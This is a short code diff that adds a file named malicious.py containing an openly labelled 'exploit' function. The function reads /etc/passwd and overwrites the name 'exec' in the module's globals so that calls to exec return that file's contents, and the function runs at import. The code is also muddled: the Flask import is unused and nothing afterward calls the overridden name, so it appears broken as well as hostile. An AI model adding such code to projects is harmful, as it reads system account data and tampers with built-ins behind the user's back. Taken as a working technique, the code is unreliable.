@@ -1,0 +1,14 @@
+# malicious.py
+from flask import request
+
+def exploit():
+    # Override the original function's behavior
+    def new_return(*args, **kwargs):
+        return f"Sensitive Data: {open('/etc/passwd').read()}"
+
+    # Inject into the global namespace
+    globals()["exec"] = new_return
+
+# Execute the exploit
+exploit()
+
